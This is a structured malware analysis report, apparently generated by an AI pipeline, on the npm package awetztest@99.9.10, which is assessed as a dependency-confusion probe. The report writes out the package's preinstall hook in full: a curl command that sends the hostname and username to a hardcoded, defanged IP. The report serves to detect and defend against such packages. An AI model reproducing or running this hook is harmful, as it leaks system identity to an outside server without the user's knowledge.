# npm awetztest@99.9.10

**Source:** datadog · **Source label:** malicious · **Released:** 2025-04-21 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package is just a package.json with a preinstall hook, and it runs on every registry install. The hook runs `curl --get --data-urlencode "host=$(hostname && whoami)"` against a hardcoded IP over HTTP (hxxp://92[.]113[.]27[.]44/), which sends the machine's hostname and current username off the machine. There are no gates: nothing checks the environment first, so any Linux or macOS sandbox with curl and outbound network will see the exfil.

## Execution

- **preinstall** `curl --get --data-urlencode "host=$(hostname && whoami)" hxxp://92[.]113[.]27[.]44/`: no package files; inline_shell.

## Gates

None.

## Requirements

- network: 92.113.27[.]44:80 (curl sends the collected host data to this HTTP server)
- installed_tool: curl (hook command calls curl)
- installed_tool: hostname (command substitution runs hostname)
- installed_tool: whoami (command substitution runs whoami)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- The prefilled launch style `download_then_exec` was wrong. The curl response is only printed to stdout and never run, so it is `inline_shell`.
- The high version number (99.9.10) and the throwaway name point to a dependency-confusion probe. That is inferred from the version pattern; no code supports it.
- `main` names index.js, but the archive has no such file.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "awetztest",
    "version": "99.9.10",
    "archive_sha256": "c4475be4a7fb9c88a090422d3a8618432e08aadea1f2a49064483dcdff3e5dbe",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-04-21",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2025-04-21-awetztest-v99.9.10.zip",
    "package_root": "layer0/tmp/tmp1wwzimk_/awetztest/package",
    "cluster_key": "ab9210fb860d23e4fa4a9fd33cb561aa03b6b61fb8619250606af73cc86d2f50",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "curl --get --data-urlencode \"host=$(hostname && whoami)\" hxxp://92[.]113[.]27[.]44/",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "Launch style changed from download_then_exec to inline_shell: curl sends a GET with hostname and whoami output in the query string; the response is only printed, never executed.",
      "package.json is the only file; main points to index.js, which is absent. No gates: the hook runs unconditionally."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "92.113.27[.]44:80",
      "reason": "curl sends the collected host data to this HTTP server"
    },
    {
      "axis": "installed_tool",
      "value": "curl",
      "reason": "hook command calls curl"
    },
    {
      "axis": "installed_tool",
      "value": "hostname",
      "reason": "command substitution runs hostname"
    },
    {
      "axis": "installed_tool",
      "value": "whoami",
      "reason": "command substitution runs whoami"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxp://92[.]113[.]27[.]44/",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": null,
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook unconditionally collects the hostname and current username and sends them to a hardcoded IP over plain HTTP. The 99.9.x version is typical of dependency-confusion probes.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
